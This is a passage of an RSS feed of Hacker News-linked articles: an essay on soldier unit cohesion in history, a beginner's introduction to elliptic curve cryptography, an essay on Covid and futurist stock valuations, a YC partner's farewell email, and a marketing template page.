June 1745 by Carl Röchling (1855-1920)</figcaption></figure>



<p>Now the funny thing about this system is that it clearly <em>worked</em>, but not for the reasons its aristocratic pioneers believed.  It was only really after the Second World War that systematic study began to be made of unit cohesion (e.g. S.L.A. Marshall, <em>Men Against Fire</em> (1947), though subsequent literature on the topic is voluminous and Marshal’s work has its problems, but its conclusions are broadly accepted having been confirmed in subsequent studies).  What emerged quite clearly was that it wasn’t ‘the cause’ or patriotism that held troops together under fire, but group cohesion born out of an intense need not to let fellow soldiers in the unit down.  In short, what held units together and made them fight more effectively was (in part, there are many conclusions in <em>Men Against Fire</em>) the strong social bonds between comrades.</p>



<p>And, in fact, the drill and discipline of early modern European armies unintentionally did quite a lot of cohesion building things.  Soldiers were removed from civilian society (isolation from larger groups builds unit cohesion), split into very small groups (keeping the core group that coheres below <a href="https://en.wikipedia.org/wiki/Dunbar%27s_number">Dunbar’s number</a> aids in group cohesion; thus <a href="https://youtu.be/a15gihWu1SM">why the platoon is a natural unit size</a>) and then pushed through difficult and unpleasant training (that drill and discipline) creating a sense of unique shared experience and sacrifice.  All of which doesn’t render men <em>machines</em>, but it does create strong social bonds within the units that will keep the men fighting even when they care little for their cause (which they generally did in this period; one does not find a super-abundance of patriotism among, say, the Army of Flanders).</p>



<p>And there is a tendency to point to this cohesion, its modern source in ‘toughening’ boot camp and to say, ‘aha!  That is the true universal about effective soldier-warriors!’  Except – and you knew there was going to be an except – except it isn’t.  Systems built on the use of drill and discipline for the development of unit cohesion through social bonds are actually, historically speaking, quite rare.  We see systems like that in use by the Romans from the Middle Republic forward (but significantly faded by the end of late antiquity; the Byzantine army doesn’t seem to function this way), in China from the Han Dynasty onward, in Japan for the <em>ashigaru</em> infantry from the Sengoku period, and in Europe from the Early Modern period.  That <em>sounds</em> like a lot, but that is relatively small minority of the historical period and even then in a relatively small minority of places.  It is, for instance, a period that only covers about half of the historical period in Western Europe, the place most often associated with this very system of organization (though that association is perhaps unfair to East Asia).</p>



<p>Instead, most societies relied on existing social bonds formed <em>outside</em> of the experience of war for cohesion.  Greek hoplite armies, for instance, generally formed up by <em>polis</em> (read: city) and then within those blocks by still smaller and smaller social divisions, so that family and neighbors would be standing shoulder to shoulder in the battle line (Sparta does this through the system of communal messes, the <em>syssitia</em>, but the idea that you fought alongside the men you dined with socially – your neighbors, generally – was perfectly normal in most Greek cities).  That was intentional – it allowed the phalanx to cohere through the social pressure not to be seen as a coward before the men who meant the most to you, whose shaming gaze you would have to endure in civilian life.  The same pressures, by the well, held together the (mostly volunteer) armies of the American Civil War (on this, see, McPherson, <em>For Cause and Comrades</em> (1997)).</p>



<p>By contrast, ‘warrior’ classes often rely on a sort of class solidarity along with the demand of an individual military aristocrat to be <em>individually</em> militarily excellent.  Richard Kaeuper quips of the literature of the medieval knightly class that it was filled with “utterly tireless, almost obsessional emphasis placed on personal prowess” (R.W. Kaeuper, <em>Chivalry and Violence in Medieval Europe</em> (1999)).  We’ve talked a fair bit about the values of mounted aristocrats, both in <a href="https://acoup.blog/2020/04/16/collections-a-trip-through-bertran-de-born-martial-values-in-the-12th-century-occitan-nobility/">their </a><a href="https://acoup.blog/2020/04/10/collections-antarah-ibn-shaddad-victory-songs/">role </a>as combatants and <a href="https://acoup.blog/2020/06/12/collections-the-battle-of-helms-deep-part-vii-hanging-by-a-thread/">in their roles as generals </a>and those values are relatively disconnected from discipline-induced forms of buddy-cohesion.  Of course exactly what ‘good generalship’ or ‘good officership’ looks like varies wildly from place to place – Alexander was expected to command his cavalry from the front; Roman emperors rarely took the battlefield and when they did they commanded from the rear since it would be foolish to risk the ‘brain’ of the army in personal combat and in any event someone at the front of a cavalry charge can hardly direct the rest of the army.</p>



<p>One of the things I find most striking about the ‘warrior ethos’ advanced by writers like Pressfield is that it accepts as normal the unique nature of the bonds that hold soldiers together in battle, assuming this bond and its shared sacrifice to be at once unique to combat and also transcendent to all combatants.  But one of the key points made very well in Sebastian Junger’s <em>War </em>(2010) and later <em>Tribe</em> (2016) is just how <em><strong>strange</strong></em> that experience is, historically.  <strong>Junger notes that in earlier societies, soldiers would have returned from war into communities </strong>(often small, agricultural communities or tribal communities) <strong>every bit as close-knit as the infantry platoon – and indeed, often involving <em>literally the same people</em> as the infantry platoon</strong>.  Instead, the intense feeling of uniqueness that modern soldiers feel about the bonds of combat is because of the historically unusual deracination produced by modern societies by the industrial revolution and the post-industrial period.</p>



<p>And Junger’s point is born out quite clearly when looking at the myriad of historical societies where those non-combat social bonds were the basis of the principles of military cohesion, be it the small-town cohesion of the hoplite phalanx or the class-based-expectation cohesion of a group of knights, or (for that matter) later modern …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/">https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26117386</guid>
            <pubDate>Fri, 12 Feb 2021 19:16:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[(Very) Basic Intro to Elliptic Curve Cryptography]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26116887">thread link</a>) | @wagslane
<br/>
February 12, 2021 | https://qvault.io/2020/09/17/very-basic-intro-to-elliptic-curve-cryptography/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/09/17/very-basic-intro-to-elliptic-curve-cryptography/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
<p>Elliptic curve cryptography is a modern <a aria-label=" (opens in a new tab)" href="https://searchsecurity.techtarget.com/definition/public-key" target="_blank" rel="noreferrer noopener nofollow">public-key&nbsp;encryption&nbsp;</a>technique based on mathematical elliptic curves and is well-known for creating smaller, faster, and more efficient cryptographic keys. For example, <a aria-label=" (opens in a new tab)" href="https://bitcoin.org/" rel="noreferrer noopener nofollow" target="_blank">Bitcoin</a> uses ECC as its asymmetric cryptosystem because of its lightweight nature.</p>
<p>In this introduction to ECC, I want to focus on the high-level ideas that make <a aria-label="ECC (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Elliptic-curve_cryptography" target="_blank">ECC</a> work. For the purposes of keeping this article easier to digest, I’ll omit implementation details and mathematical proofs, we can save those for another time.</p>
<h2>What is elliptic curve cryptography used&nbsp;for?</h2>
<p>A common use of ECC is to encrypt data so that only authorized parties can decrypt it. This has several obvious use cases but is most often used to encrypt internet traffic. For example, on the <a href="https://qvault.io/">Qvault web app</a> I could used ECC to encrypt a verification email so that no one but the recipient can read the message.</p>
<h2>ECC is public-key cryptography</h2>
<p>There are many types of public-key cryptography, and Elliptic Curve Cryptography is just one flavor. Other algorithms include <a aria-label="RSA (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)" target="_blank">RSA</a>, <a aria-label="Diffie-Helman (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange" target="_blank">Diffie-Helman</a>, etc. Let’s go over a quick background of public-key cryptography as a jumping-off point, so that I can discuss ECC and build on top of these ideas. By all means, study more in-depth on public-key cryptography when you have the time.</p>
<p>Public-key cryptography allows the following to happen:</p>

<p>We create two keys, a public key, and a private key. The public key is given freely, and any party can encrypt data by using it. However, the private key is kept secret and only those who hold it will have the ability to decrypt data.</p>
<h2>An example of public-key cryptography</h2>
<p>Let’s pretend that Facebook is going to receive a private post from Donald Trump. Facebook needs to be able to ensure that when the ex-president sends his post over the internet, no one in the middle (Like the NSA, or an internet service provider) can read the message. The entire exchange using public-key cryptography would go like this:</p>
<ul><li>Donald Trump Notifies Facebook that he wants to send them a private post</li><li>Facebook sends Donald Trump their public key</li><li>Donald Trump uses the public key to encrypt his post:</li></ul>
<p><em>“I love Fox and Friends” + Public Key = “s80s1s9sadjds9s”</em></p>
<ul><li>Donald Trump sends only the encrypted message to Facebook</li><li>Facebook uses its private key to decrypt the message:</li></ul>
<p><em>“s80s1s9sadjds9s” + Private Key = “I love Fox and Friends”</em></p>
<p>As you can see, this form of encryption can be quite useful. Here are some key points:</p>
<ul><li>The public key can safely be sent to anyone. It’s public.</li><li>The private key must be kept safe because if someone in the middle were to get the private key, they could decrypt messages.</li><li>Computers can quickly use the public key to encrypt a message, and quickly use the private key to decrypt a message.</li><li>Computers require a <em>very</em> long time (millions of years) to derive the original data from the encrypted message if they don’t have the private key.</li></ul>
<h2>How it Works: The Trapdoor&nbsp;Function</h2>
<p>The crux of all public-key cryptographic algorithms is that they each have their own unique trapdoor function<strong>. </strong>A trapdoor function is a function that can only be computed one way, or at least can only be computed one way <em>easily</em> (in less than millions of years using modern computers).</p>
<h3>Not a trapdoor function:</h3>
<p><code>A + B = C</code></p>
<p>If I’m given A and B I can compute C. However, if I’m given B and C I can also compute A. This is not a trapdoor function.</p>
<h3>Trapdoor function:</h3>
<p><code>"I love Fox and Friends” + Public Key --&gt; s80s1s9sadjds9s</code></p>
<p>If given <em>“I love Fox and Friends”</em> and the public key, I can produce <code>s80s1s9sadjds9s</code>, but if given <code>s80s1s9sadjds9s</code> and the Public Key I can’t produce <em>“I love Fox and Friends”</em></p>
<p>In RSA, which is arguably the most widely used public-key cryptosystem, the trapdoor function relies on how hard it is to factor large numbers into their prime factors.</p>
<p><strong>Public Key:</strong> <code>944,871,836,856,449,473</code></p>
<p><strong>Private Key:</strong> <code>961,748,941</code> and <code>982,451,653</code></p>
<p>In the example above the public key is a very large number, and the private key is the two prime factors of the public key. This is a good example of a Trapdoor Function because it is very easy to multiply the numbers in the private key together to get the public key, but if all you have is the public key it will take a very long time using a computer to re-create the private key.</p>
<p><em>Note: In real cryptography, the private key would need to be 200+ digits long to be considered secure.</em></p>
<h2>What Makes Elliptic Curve Cryptography Different?</h2>
<p>You would use ECC for the same reasons as RSA. ECC and RSA both generate a public and private key and allow two parties to communicate securely. One advantage to ECC however, is that a 256-bit key in ECC offers about the same security as a 3072-bit key using RSA. ECC allows resource-constrained systems like smartphones, embedded computers, and cryptocurrency networks to use ~10% of the storage space and bandwidth required by RSA.</p>
<h2>ECC’s Trapdoor&nbsp;Function</h2>
<p>This is probably why most of you are here. The trapdoor function is what makes ECC special and different than RSA. The trapdoor function is similar to a mathematical game of pool.</p>
<p>First, we start with an arbitrary point on the curve. Next, we use the dot function to find a new point. Finally, we keep repeating the dot function to hop around the curve until we finally end up at our last point. Let’s walk through the algorithm.</p>

<ul><li>Starting at <code>A</code>:</li><li><code>A dot B = -C</code> (Draw a line from A to B and it intersects at -C)</li><li>Reflect across the X-axis from -C to C</li><li><code>A dot C = -D</code> (Draw a line from A to C and it intersects -D)</li><li>Reflect across the X-axis from -D to D</li><li><code>A dot D = -E</code> (Draw a line from A to D and it intersects -E)</li><li>Reflect across the X-axis from -E to E</li></ul>
<p>This is a great trapdoor function because if you know where the starting point (A) is and how many hops are required to get to the ending point (E), it’s very easy to find the ending point. On the other hand, if all you know is where the starting point and ending point are, it’s nearly impossible to find how many hops it took to get there.</p>
<p>Public Key: Starting Point A, Ending Point E</p>
<p>Private Key: Number of hops from A to E</p>
<h2>Questions?</h2>
<p>Here are a few questions I had when I first learned about ECC. Hopefully, I can address them properly.</p>
<h3>1. How is the second point found? If the dot function is basically drawing a line between two points, don’t you need a second point to start&nbsp;with?</h3>
<p>No. The second point (we will call it -R below) is actually the result of P dot P (let’s assume the first point is called P)</p>
<p><code>P dot P = -R</code></p>
<p>So what is <code>P dot P</code>? It is actually just the tangent line of P. See the graphic below:</p>

<h3>2. What happens if the dot function produces a line that will go way off out to some&nbsp;extreme?</h3>
<p>If the line doesn’t hit the curve close to the origin, we can actually define a maximum X value where the line will wrap back around and start from the beginning again. See the graphic below for an example.</p>

<h3>3. If the number of hops is the private key, can’t I just count the hops until I hit the endpoint?</h3>
<p>Nope! The number of hops is <em>very</em> large, something like <code>2^256</code>. It would take far too long to compute each hop one by one, for example <code>p dot p dot p dot p ...</code>.</p>
<p>If however, you know the number of hops you can use an <a href="https://en.wikipedia.org/wiki/Exponentiation_by_squaring" target="_blank" aria-label="exponentiation (opens in a new tab)" rel="noreferrer noopener nofollow">exponentiation</a> trick to find the ending point quite quickly. For example, and omitting the details of elliptic curve operations: <code>2P = P dot P</code> and then <code>4P = 2P dot 2P</code>. This allows you to get up to those crazy high calculations exponentially faster.</p>
<h2>Who Cares?</h2>
<p>ECC is used as the cryptographic key algorithm in Bitcoin because it potentially can save ~90% of the resources used by a similar RSA system. It seems that each year we see more systems moving from RSA to a more modern elliptic curve approach.</p>
<div><div>
<h2>Thanks For Reading!</h2>
<p>If you’re interested in furthering your CS career, take our <a href="https://qvault.io/">computer science courses</a></p>
<p>Follow and hit us up on Twitter <a href="https://twitter.com/q_vault" rel="noopener">@q_vault</a> if you have any questions or comments, and if we’ve made a mistake be sure to <a href="https://qvault.io/contact/">let us know</a> so we can get it corrected!</p>
<p><a href="https://mailchi.mp/5c7f5c281bbe/qvault-newsletter-subscribe" rel="noopener">Subscribe</a> to our newsletter for more programming articles</p>
</div></div>
<h2>Related Articles</h2>
<ul><li><a href="https://qvault.io/2020/01/29/hashing-passwords-python-cryptography-examples/">Hashing Passwords – Python Cryptography Examples</a></li><li><a href="https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/">How SHA-2 Works Step-By-Step (SHA-256)</a></li><li><a href="https://qvault.io/2019/07/09/is-aes-256-quantum-resistant/">Is AES-256 Quantum Resistant?</a></li></ul>
 </div></div>]]>
            </description>
            <link>https://qvault.io/2020/09/17/very-basic-intro-to-elliptic-curve-cryptography/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116887</guid>
            <pubDate>Fri, 12 Feb 2021 18:36:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Covid brought the future back]]>
            </title>
            <description>
<![CDATA[
Score 119 | Comments 69 (<a href="https://news.ycombinator.com/item?id=26116488">thread link</a>) | @furtively
<br/>
February 12, 2021 | https://worksinprogress.co/issue/how-covid-brought-the-future-back/ | <a href="https://web.archive.org/web/*/https://worksinprogress.co/issue/how-covid-brought-the-future-back/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<div>
						<p>When the US joined World War Two, it set back a number of peacetime R&amp;D projects. A team at Bell Labs had been studying some interesting properties of semiconducting substances, with the hope that they might find a way to replace the then-ubiquitous vacuum tube. But the exigencies of wartime complicated their plans—for one thing, the only supplier of sufficiently pure silicon was a German company—so they took a break to focus on wartime applications like radar. By the time they returned to regular work, the war was won, the US industrial base had dramatically ramped up (now DuPont, not German suppliers, made the world’s purest silicon), and the team had acquired an encyclopedic knowledge of how substances like silicon and germanium behave.</p>
<p>Two years later, the transistor was born.</p>
<p>Crises radically reshape priorities; they cancel some projects, and accelerate others. But another effect they have is to make people more conscious of the future. To struggle through a crisis is, implicitly, to view the future as a point very much worth getting to. The Bell Labs team certainly helped build a better postwar future, and arguably Covid-19 has pushed people in the same direction.</p>
<p>We shouldn’t expect the results of this to be visible just yet. Scientific progress is visible on a lag: while the <i>New York Times</i> did mention the invention of transistors, it was midway through a column called “news of the radio,” hardly an accurate assessment of the impact of one of the twentieth century’s great inventions. Fortunately, there are more real-time ways to approximate people’s attitudes towards the future—the stock market is a real-time dollar-weighted poll about what kinds of companies will matter, and how that’s changing.</p>
<p>One of the surprising consequences of the Covid-19 pandemic was that, after a brief and fearsome decline, overall asset prices rose. That’s partly an artifact of how policymakers responded to the pandemic; pumping liquidity into the market does help offset supply shocks, and some of that money finds its way into speculative vehicles. But even <i>within</i> the market, there’s been a striking rise in investor interest in electric vehicles, autonomous cars, AI, and software companies ranging from consumer-facing companies like Facebook and Google to complex enterprise products like Snowflake.</p>
<p>The market’s judgments always have to be taken judiciously. Humans are imperfect judges of the present, not to mention the future. And as the recent GameStop fireworks demonstrate, sometimes prices can be driven more by technical aspects of market structure than by a cold and calculating assessment of the net present value of future cash flows. Even GameStop’s run-up, though, was born out of forward-looking analysis of a business, not gambling. The original thesis behind buying GameStop, before it turned into a social movement devoted to punishing hedge funds, <i>was</i> an argument that the company was fundamentally underpriced—because the market had missed its opportunity to transcend brick-and-mortar retailing and digitize its business!</p>
<p>There are definite precedents for extrapolating about new concerns from stock prices. Defense stocks rise when war is rumored to be imminent, for example, and cyclical stocks’ performance tends to change ahead of macro data on the economic cycle. More narrowly, the economist Armen Alchian <a href="https://www.sciencedirect.com/science/article/abs/pii/S0929119914000546">deduced that hydrogen bombs use lithium by tracking the stock prices of mining companies</a>.</p>
<p>Today, the world’s most valuable automaker is Tesla, with a market capitalization of $827bn, compared to $232bn for runner-up Toyota. Tesla isn’t valued based on its current production (just under 500,000 vehicles annually, compared to Toyota’s 9.2 million) or high margins (it eked out a net profit margin of just under 2%, less than half of Toyota’s results). Instead, Tesla is valued based on three forward-looking intangibles: it’s a pure-play electric vehicle company, its brand name is synonymous with clean energy rather than the more mixed reaction General Motors or Hyundai might engender, and its charismatic CEO has been able to recruit cult-like adherents to his vision of sustainable transportation and a multiplanetary species.</p>
<p>Calling Tesla is a cult isn’t pejorative, just descriptive: any organization that successfully accomplishes something that is widely believed to be impossible has to have distinctive beliefs, and any group of people who behave in unusual ways because of shared beliefs can be reasonably described as a cult. Some companies use their cultish aspects in harmful ways, but cults are a social design pattern that shows up over and over again, in successful companies and political movements. Cult-like traits are more common with companies that are growing fast—it would be hard for a steel mill or a local bank to engender this kind of behavior in its employees. It’s a way to focus everyone’s energy on the future, and avoid distracting questions about whether or not that future is viable—a way to raise the variance of outcomes, which makes extreme upside scenarios possible while increasing the odds of failure.</p>
<p>Tesla is not the only futuristic vehicle stock to be accorded a high value by the stock market. In fact, it’s arguably among the more mature. There are at least earnings to put a price/earnings multiple on, whereas many of the more recent EV companies are at an earlier stage than that. Luminar Technologies, for example, went public through a reverse merger late last year, and currently has a market value of almost $11bn. The company has minimal sales ($11m over the last nine months) and is still pouring money into R&amp;D. But LiDAR appears to be the most promising way to get cars to full autonomy, so investors are willing to value it based on the chance that a) autonomous vehicles will happen, b) they’ll use LiDAR, c) they’ll use Luminar’s systems to do it, and d) Luminar will be able to earn acceptable margins selling it.</p>
<p>The joint probability of all of those possibilities is low if they’re independent: if there’s a 10% chance of autonomous vehicles, a 10% chance they’ll use LiDAR, a 10% chance that LiDAR-using AVs will use Luminar’s technology, and a 10% chance that Luminar will get good margins, then the odds of Luminar being a good investment work out to 0.01%. But the more ambitious a company is, the more its job is to make those variables <i>conditional</i> instead: the closer a company gets to being the <i>only</i> way a given technology can happen, the more technology risk becomes synonymous with business risk, which compresses the overall range of outcomes. It also solves for the viable-business condition: if there’s just one company that can make AVs possible, then that company will have the pricing power necessary to make them profitable, too.</p>
<p>This dynamic actually works in two directions: first, it means that the odds of Luminar selling LiDAR conditional on LiDAR becoming ubiquitous are higher, because the latter is most probably going to happen if the former is true. And second, it’s a recruiting tool: if there’s one company that has a reasonable shot at accomplishing something, and it’s a desirable goal, then the company has a monopoly on the kinds of employees who can achieve that goal. This is a point Peter Thiel articulates in <i>Zero to One</i>, and it’s one of the reasons technology companies have such a skewed distribution of outcomes. They articulate a variant view, which means they attract people who share that variant view—and since the argument is settled by technology and economics, they don’t have to persuade the rest of the world, just to offer a better product.</p>
<p>The rise of special purpose acquisition vehicles, or SPACs, is a general testament to a more forward-looking market. In a conventional IPO, an operating company sells shares to the public; with a SPAC, an empty shell company goes public, and then identifies a private company to merge with. Due to a quirk in securities laws, a traditional IPO prospectus only shows a company’s backwards-looking estimates, and makes heavily-qualified statements about the future. A company that goes public through a SPAC is technically engaging in a merger, rather than an IPO, and the rules are different. When a public company buys another company, securities laws allow it to talk about that company’s anticipated growth, or the likely cost savings of the merger. Similarly, SPAC offerings can talk up a company’s long-term prospects, and even make exact estimates of future revenue.</p>
<p>SPACs have existed for years, but they exploded in popularity in 2020. Of the 466 SPAC companies that went public from 2011 through 2020, 248 of them went public in 2020 alone. A number of technical forces drove this—a large number of private companies looking for acquisitions, investors eager to get into <i>any</i> growth company early, some technicalities around SPAC issuance that make them attractive to specialist hedge funds. But the key driver of excitement about SPACs is that they can take companies public based on a future-focused outlook.</p>
<p>When Virgin Galactic went public by merging with Chamath Palihapitiya’s Social Capital Hedosophia Holdings, the company, which has taken deposits but generated minimal revenue, was able to project $590 million in annual revenue in the year 2023, and over a quarter of a billion dollars in pretax, pre-depreciation earnings. While this was optimistic, it’s also demonstrative: a company like Virgin Galactic would have been almost impossible to take public in a conventional way, because backwards-looking financial statements showed only losses. it may not work out as a business, or live up to its projections, but those projections got more plausible once it had access to public markets for funding.</p>
<p>High valuations for money-losing, often pre-revenue companies remind people of the dot-com bubble, and it’s worth putting that bubble in perspective. Someone who bought the market at its peak in March 2000 has earned a 6% compounded return since then. …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://worksinprogress.co/issue/how-covid-brought-the-future-back/">https://worksinprogress.co/issue/how-covid-brought-the-future-back/</a></em></p>]]>
            </description>
            <link>https://worksinprogress.co/issue/how-covid-brought-the-future-back/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116488</guid>
            <pubDate>Fri, 12 Feb 2021 17:58:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Goodbye YC]]>
            </title>
            <description>
<![CDATA[
Score 277 | Comments 40 (<a href="https://news.ycombinator.com/item?id=26116420">thread link</a>) | @awaxman11
<br/>
February 12, 2021 | https://blog.aaronkharris.com/goodbye-yc | <a href="https://web.archive.org/web/*/https://blog.aaronkharris.com/goodbye-yc">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
      <div><p><i>I sent this email to the whole team at YC yesterday:</i></p><p>When I joined&nbsp;YC&nbsp;7.5 years ago, there weren’t many people around. PG and Jessica were still running things. We had offices in Mountain View, Palo Alto, and on Kearny street, but they were nearly always empty. The only meeting on any calendar was the lunch on Thursdays where we’d talk about companies over takeout or at a table in a crowded restaurant.</p><p>The ways in which we’ve changed since then have been amazing to see.&nbsp;YC&nbsp;has grown in every way imaginable. The scope of what&nbsp;YC&nbsp;funds is larger. The team is bigger and more capable. The number of companies is pushing towards some ever receding upper bound. There’s more software, a larger community, and more programming designed to help&nbsp;YC&nbsp;founders build better futures.</p><p>I feel a deep sense of pride and honor at the part that I’ve played in that change and growth. I recall the first conversation I had with Aaron King about the Series A for Snapdocs. The questions he and I worked through were the kernel of the Series A program. I am amazed to see the directions in which Janelle is now building YCA. I’m grateful for the part I played in our conversations about growing beyond seed investing - conversations which eventually took shape as YCC. And, of course, there are fifteen batches worth of applications, interviews, dinners, office hours, and demo days rattling around in my head.<br></p><p>I’ve been thinking, recently, about the founders with whom I’ve had a chance to work. I’ve lost count of the number of incredible people I’ve gotten to know over these last years. Thinking back, it’s easy to see how the sheer weight of numbers can drive a person to be jaded about the problems that founders face. But the other night, as I spoke with a founder about a tough situation, I was reminded about how important it is to that individual that she gets the best possible advice. This is a lesson I learned time and again, and is something I hope I’ll never forget.</p><p>And then there’s the funny stuff. There were stolen air conditioners, barefoot pitches, robots that did not make sandwiches, update emails pulled from the I Ching, bandages, inhaled jet fuel, and literal blood on the interview floors. These are the things that I’ll remember long after everything else.</p><p>The truth is, I only meant to stick around&nbsp;YC&nbsp;for two years. Somehow, that two became two more, and then some more. As meaningfully as I’ve enjoyed my work here, it’s time for me to move onto something different and new and outside the bounds of what&nbsp;YC&nbsp;does. That’s a strange, exhilarating moment, and an important one for me and for my family. The pandemic provided the practical and existential nudge I needed to see the depth of this need.</p><p>To my fellow partners - thank you for your tireless work for our founders and for&nbsp;YC. Thank you for everything you’ve taught me, for all the strange conversations we’ve had, and for all the demo day presentations we’ve crafted.</p><p>To PG and Jessica and Trevor and RTM - thank you for giving me this opportunity and for making&nbsp;YC&nbsp;the kind of place I could love enough to stay long after I meant to leave.</p><p>To Janelle - thank you for building YCA with me and for being the best person I could imagine to take it into the future.</p><p>To everyone else -&nbsp;YC’s mission in the world is abstract. It could mean so many things, but it wouldn’t be anything without your work. Whether you are managing founder expectations about housing in the Bay Area, helping someone understand the mysteries of cap tables, talking someone down off the ledge of yelling at a reporter, or making sure that there will one day be an office to come back to, you are what makes&nbsp;YC&nbsp;a viable, vital force in the world.</p><p>I’ve never liked&nbsp;goodbye.</p><p>aaron</p></div>
    
  </div></div>]]>
            </description>
            <link>https://blog.aaronkharris.com/goodbye-yc</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116420</guid>
            <pubDate>Fri, 12 Feb 2021 17:54:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Marketing Patterns – DIY Template for Growth]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26116276">thread link</a>) | @zxlk21e
<br/>
February 12, 2021 | https://terrygodier.com/patterns/ | <a href="https://web.archive.org/web/*/https://terrygodier.com/patterns/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<section>

<!-- begin patterns -->
												<div>
					<p><a href="https://terrygodier.com/patterns/ridiculous-products-for-digital-pr/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-150x79.png" alt="digital pr 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Launch Ridiculous Products for Digital PR and Links 1" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/interest-tests-with-facebook-ads/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-150x79.png" alt="interest targeting 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Test Audience Interests with Facebook Ads 2" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/leverage-your-data/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-150x79.png" alt="data stories 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Leverage Your Data for Marketing and Linkbuilding 3" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
